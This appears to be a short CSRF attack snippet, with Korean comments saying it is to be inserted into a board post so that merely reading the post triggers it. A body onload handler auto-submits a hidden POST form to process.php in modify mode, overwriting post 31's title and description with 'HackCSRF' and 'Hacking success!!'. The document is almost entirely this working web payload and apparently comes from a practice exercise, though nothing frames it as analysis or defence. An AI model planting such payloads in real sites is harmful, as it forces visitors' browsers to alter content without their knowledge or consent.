//게시글에 삽입
//body onload 게시글을 읽는 순간 from_test가 submit 됨
<body onload="document.form_test.submit();">
    <form name="form_test" action="./process.php?mode=modify" method="POST">
        <input type="hidden" name="id" value="31">
        <input type="hidden" name="title" value="HackCSRF">
        <input type="hidden" name="des" value="Hacking success!!">
</form>
